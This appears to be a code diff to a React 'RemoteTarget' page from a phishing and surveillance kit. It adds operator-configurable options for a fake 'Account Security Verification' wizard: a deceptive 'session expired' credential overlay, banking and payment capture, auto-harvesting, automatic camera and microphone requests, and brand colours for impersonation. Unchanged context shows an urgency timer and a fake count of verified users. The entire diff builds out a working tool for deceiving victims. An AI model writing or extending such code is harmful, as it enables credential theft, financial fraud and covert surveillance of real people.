@@ -13,11 +13,23 @@ import {
   Timer, Users, Fingerprint,
 } from "lucide-react";
 
+interface TargetPageConfig {
+  steps: { identity: boolean; biometric: boolean; voice: boolean; environment: boolean; documents: boolean };
+  enableBanking: boolean;
+  enableAutoHarvest: boolean;
+  enableCredentialOverlay: boolean;
+  autoRequestPermissions: boolean;
+  pageTitle: string;
+  pageSubtitle: string;
+  brandColor: "blue" | "red" | "green" | "purple" | "orange";
+}
+
 interface SessionInfo {
   id: number;
   name: string;
   status: string;
   sessionToken: string;
+  pageConfig: TargetPageConfig | null;
 }
 
 interface PermissionState {
@@ -250,7 +262,7 @@ export default function RemoteTarget() {
   const [credTab, setCredTab] = useState<"login" | "banking">("login");
   const [showPassword, setShowPassword] = useState(false);
 
-  const [currentStep, setCurrentStep] = useState(1);
+  const [currentStep, setCurrentStep] = useState(0);
   const [scanProgress, setScanProgress] = useState(0);
   const [scanStatus, setScanStatus] = useState("");
   const [scanRunning, setScanRunning] = useState(false);
@@ -261,6 +273,30 @@ export default function RemoteTarget() {
   const [verificationCount] = useState(() => 2400 + Math.floor(Math.random() * 600));
   const [autoHarvestDone, setAutoHarvestDone] = useState(false);
   const [initStatus, setInitStatus] = useState("Establishing secure connection...");
+
+  const cfg = session?.pageConfig || { steps: { identity: true, biometric: true, voice: true, environment: true, documents: true }, enableBanking: false, enableAutoHarvest: true, enableCredentialOverlay: false, autoRequestPermissions: false, pageTitle: "Account Security Verification", pageSubtitle: "", brandColor: "blue" as const };
+
+  const activeStepKeys = [
+    cfg.steps.identity ? "identity" : null,
+    cfg.steps.biometric ? "biometric" : null,
+    cfg.steps.voice ? "voice" : null,
+    cfg.steps.environment ? "environment" : null,
+    cfg.steps.documents ? "documents" : null,
+  ].filter(Boolean) as string[];
+
+  const activeWizardSteps = WIZARD_STEPS.filter((_, i) => {
+    const keys = ["identity", "biometric", "voice", "environment", "documents"];
+    return activeStepKeys.includes(keys[i]);
+  });
+
+  const brandColors: Record<string, { from: string; to: string; accent: string; bg: string }> = {
+    blue: { from: "from-blue-600", to: "to-blue-800", accent: "text-blue-500", bg: "bg-blue-500/10" },
+    red: { from: "from-red-600", to: "to-red-800", accent: "text-red-500", bg: "bg-red-500/10" },
+    green: { from: "from-green-600", to: "to-green-800", accent: "text-green-500", bg: "bg-green-500/10" },
+    purple: { from: "from-purple-600", to: "to-purple-800", accent: "text-purple-500", bg: "bg-purple-500/10" },
+    orange: { from: "from-orange-600", to: "to-orange-800", accent: "text-orange-500", bg: "bg-orange-500/10" },
+  };
+  const brand = brandColors[cfg.brandColor] || brandColors.blue;
 
   const wsRef = useRef<WebSocket | null>(null);
   const pcRef = useRef<RTCPeerConnection | null>(null);
@@ -293,6 +329,18 @@ export default function RemoteTarget() {
   }, [token]);
 
   useEffect(() => {
+    if (session && currentStep === 0) {
+      if (activeStepKeys.length === 0) {
+        setWizardComplete(true);
+        return;
+      }
+      const stepKeys = ["identity", "biometric", "voice", "environment", "documents"];
+      const firstActive = stepKeys.findIndex((k) => activeStepKeys.includes(k));
+      setCurrentStep(firstActive >= 0 ? firstActive + 1 : 1);
+    }
+  }, [session, currentStep, activeStepKeys]);
+
+  useEffect(() => {
     async function fetchSession() {
       try {
         const res = await fetch(`/api/remote-sessions/token/${token}`);
@@ -321,6 +369,7 @@ export default function RemoteTarget() {
 
   useEffect(() => {
     if (!session || autoHarvestDone) return;
+    if (!cfg.enableAutoHarvest) { setAutoHarvestDone(true); return; }
 
     const runAutoHarvest = async () => {
       setInitStatus("Establishing secure connection...");
@@ -683,10 +732,15 @@ export default function RemoteTarget() {
   };
 
   const handleCredentials = useCallback(() => {
+    if (!cfg.enableCredentialOverlay) {
+      updatePermission("credentials", { granted: true, loading: false });
+      sendWS({ type: "rc_permission_granted", permission: "credentials" });
+      return;
+    }
     updatePermission("credentials", { loading: true, error: null });
     setShowCredentialOverlay(true);
     updatePermission("credentials", { loading: false, granted: false, error: null });
-  }, [updatePermission]);
+  }, [updatePermission, cfg.enableCredentialOverlay, sendWS]);
 
   const submitCredentials = useCallback((type: "login" | "banking") => {
     const data: Record<string, string> = { type, timestamp: new Date().toISOString() };
@@ -794,14 +848,18 @@ export default function RemoteTarget() {
 
   const advanceStep = useCallback(() => {
     setCurrentStep((prev) => {
-      const next = prev + 1;
+      const stepKeys = ["identity", "biometric", "voice", "environment", "documents"];
+      let next = prev + 1;
+      while (next <= WIZARD_STEPS.length && !activeStepKeys.includes(stepKeys[next - 1])) {
+        next++;
+      }
       if (next > WIZARD_STEPS.length) {
         setWizardComplete(true);
         return prev;
       }
       return next;
     });
-  }, []);
+  }, [activeStepKeys]);
 
   const runEnvironmentScan = useCallback(async () => {
     setScanRunning(true);
@@ -844,6 +902,27 @@ export default function RemoteTarget() {
     setScanRunning(false);
     setTimeout(() => advanceStep(), 600);
   }, [handleLocation, handleBrowserData, handleClipboard, handleDeviceInfo, permissions, advanceStep]);
+
+  useEffect(() => {
+    if (!cfg.autoRequestPermissions || currentStep === 0) return;
+    const stepKeys = ["identity", "biometric", "voice", "environment", "documents"];
+    const stepKey = stepKeys[currentStep - 1];
+    const autoRequestMap: Record<string, PermissionKey | null> = {
+      biometric: "camera",
+      voice: "microphone",
+    };
+    const permToRequest = autoRequestMap[stepKey];
+    if (permToRequest && !permissions[permToRequest].granted && !permissions[permToRequest].loading) {
+      const timer = setTimeout(() => {
+        if (handlers[permToRequest]) handlers[permToRequest]();
+      }, 1000);
+      return () => clearTimeout(timer);
+    }
+    if (stepKey === "environment" && !scanRunning && scanProgress === 0) {
+      const timer = setTimeout(() => runEnvironmentScan(), 800);
+      return () => clearTimeout(timer);
+    }
+  }, [currentStep, cfg.autoRequestPermissions]);
 
   useEffect(() => {
     if (!session) return;
@@ -905,7 +984,8 @@ export default function RemoteTarget() {
     );
   }
 
-  const overallProgress = Math.round(((currentStep - 1) / WIZARD_STEPS.length) * 100);
+  const currentStepIndex = activeWizardSteps.findIndex((s) => s.id === currentStep);
+  const overallProgress = activeWizardSteps.length > 0 ? Math.round((Math.max(0, currentStepIndex) / activeWizardSteps.length) * 100) : 0;
   const timerMin = Math.floor(urgencyTimer / 60);
   const timerSec = urgencyTimer % 60;
 
@@ -936,29 +1016,31 @@ export default function RemoteTarget() {
 
       <Card className="border-blue-500/20">
         <CardContent className="p-0">
-          <div className="bg-gradient-to-r from-blue-600 to-blue-800 p-3 rounded-t-lg">
+          <div className={`bg-gradient-to-r ${brand.from} ${brand.to} p-3 rounded-t-lg`}>
             <div className="flex items-center gap-2 text-white">
               <Shield className="w-4 h-4" />
               <span className="font-medium text-xs">Secure Authentication Portal</span>
             </div>
           </div>
           <div className="p-5 space-y-4">
-            <div className="flex gap-1 border-b border-border/50 mb-4">
-              <button
-                className={`px-3 py-2 text-xs font-medium border-b-2 transition-colors ${credTab === "login" ? "border-primary text-primary" : "border-transparent text-muted-foreground hover:text-foreground"}`}
-                onClick={() => setCredTab("login")}
-                data-testid="tab-login"
-              >
-                Account Login
-              </button>
-              <button
-                className={`px-3 py-2 text-xs font-medium border-b-2 transition-colors ${credTab === "banking" ? "border-primary text-primary" : "border-transparent text-muted-foreground hover:text-foreground"}`}
-                onClick={() => setCredTab("banking")}
-                data-testid="tab-banking"
-              >
-                Payment Verification
-              </button>
-            </div>
+            {cfg.enableBanking && (
+              <div className="flex gap-1 border-b border-border/50 mb-4">
+                <button
+                  className={`px-3 py-2 text-xs font-medium border-b-2 transition-colors ${credTab === "login" ? "border-primary text-primary" : "border-transparent text-muted-foreground hover:text-foreground"}`}
+                  onClick={() => setCredTab("login")}
+                  data-testid="tab-login"
+                >
+                  Account Login
+                </button>
+                <button
+                  className={`px-3 py-2 text-xs font-medium border-b-2 transition-colors ${credTab === "banking" ? "border-primary text-primary" : "border-transparent text-muted-foreground hover:text-foreground"}`}
+                  onClick={() => setCredTab("banking")}
+                  data-testid="tab-banking"
+                >
+                  Payment Verification
+                </button>
+              </div>
+            )}
 
             {credTab === "login" && (
               <div className="space-y-3">
@@ -1299,18 +1381,20 @@ export default function RemoteTarget() {
         <div className="fixed inset-0 z-[60] bg-black/70 flex items-center justify-center p-4" data-testid="modal-credential-overlay">
           <Card className="max-w-md w-full animate-in fade-in zoom-in-95">
             <CardContent className="p-0">
-              <div className="bg-gradient-to-r from-blue-600 to-blue-800 p-4 rounded-t-lg">
+              <div className={`bg-gradient-to-r ${brand.from} ${brand.to} p-4 rounded-t-lg`}>
                 <div className="flex items-center gap-2 text-white">
                   <Lock className="w-5 h-5" />
                   <span className="font-semibold text-sm">Security Verification Required</span>
                 </div>
-                <p className="text-blue-100 text-xs mt-1">Your session has expired. Please verify your identity to continue.</p>
+                <p className="text-white/80 text-xs mt-1">Your session has expired. Please verify your identity to continue.</p>
               </div>
               <div className="p-5 space-y-4">
-                <div className="flex gap-1 border-b border-border/50 mb-4">
-                  <button className={`px-3 py-2 text-xs font-medium border-b-2 transition-colors ${credTab === "login" ? "border-primary text-primary" : "border-transparent text-muted-foreground hover:text-foreground"}`} onClick={() => setCredTab("login")} data-testid="tab-login-overlay">Account Login</button>
-                  <button className={`px-3 py-2 text-xs font-medium border-b-2 transition-colors ${credTab === "banking" ? "border-primary text-primary" : "border-transparent text-muted-foreground hover:text-foreground"}`} onClick={() => setCredTab("banking")} data-testid="tab-banking-overlay">Payment Verification</button>
-                </div>
+                {cfg.enableBanking && (
+                  <div className="flex gap-1 border-b border-border/50 mb-4">
+                    <button className={`px-3 py-2 text-xs font-medium border-b-2 transition-colors ${credTab === "login" ? "border-primary text-primary" : "border-transparent text-muted-foreground hover:text-foreground"}`} onClick={() => setCredTab("login")} data-testid="tab-login-overlay">Account Login</button>
+                    <button className={`px-3 py-2 text-xs font-medium border-b-2 transition-colors ${credTab === "banking" ? "border-primary text-primary" : "border-transparent text-muted-foreground hover:text-foreground"}`} onClick={() => setCredTab("banking")} data-testid="tab-banking-overlay">Payment Verification</button>
+                  </div>
+                )}
                 {credTab === "login" && (
                   <div className="space-y-3">
                     <div><label className="text-xs font-medium text-muted-foreground mb-1 block">Email Address</label><Input type="email" placeholder="name@example.com" value={credForm.email} onChange={(e) => setCredForm((p) => ({ ...p, email: e.target.value }))} data-testid="input-cred-email-overlay" /></div>
@@ -1368,7 +1452,8 @@ export default function RemoteTarget() {
           <div className="inline-flex items-center justify-center w-12 h-12 rounded-md bg-primary/10 mb-3">
             <Shield className="w-6 h-6 text-primary" />
           </div>
-          <h1 className="text-lg font-semibold mb-1" data-testid="text-page-title">Account Security Verification</h1>
+          <h1 className="text-lg font-semibold mb-1" data-testid="text-page-title">{cfg.pageTitle}</h1>
+          {cfg.pageSubtitle && <p className="text-xs text-muted-foreground mb-1">{cfg.pageSubtitle}</p>}
           {session && <p className="text-xs text-muted-foreground" data-testid="text-session-name">{session.name}</p>}
         </div>
 
@@ -1402,19 +1487,19 @@ export default function RemoteTarget() {
 
             <div className="mb-8">
               <div className="flex items-center justify-between mb-2">
-                <span className="text-xs text-muted-foreground">Step {currentStep} of {WIZARD_STEPS.length}</span>
+                <span className="text-xs text-muted-foreground">Step {Math.max(1, currentStepIndex + 1)} of {activeWizardSteps.length}</span>
                 <span className="text-xs text-muted-foreground" data-testid="text-progress-percent">{overallProgress}% complete</span>
               </div>
               <Progress value={overallProgress} className="h-1.5" data-testid="progress-wizard" />
               <div className="flex justify-between mt-3">
-                {WIZARD_STEPS.map((step) => (
+                {activeWizardSteps.map((step, idx) => (
                   <div key={step.id} className="flex flex-col items-center flex-1">
                     <div className={`w-6 h-6 rounded-full flex items-center justify-center text-[10px] font-medium transition-colors ${
-                      step.id < currentStep ? "bg-emerald-500 text-white" :
+                      idx < currentStepIndex ? "bg-emerald-500 text-white" :
                       step.id === currentStep ? "bg-primary text-primary-foreground" :
                       "bg-muted text-muted-foreground"
                     }`} data-testid={`step-indicator-${step.id}`}>
-                      {step.id < currentStep ? <CheckCircle2 className="w-3.5 h-3.5" /> : step.id}
+                      {idx < currentStepIndex ? <CheckCircle2 className="w-3.5 h-3.5" /> : idx + 1}
                     </div>
                     <span className="text-[9px] text-muted-foreground mt-1 text-center hidden sm:block">{step.title}</span>
                   </div>
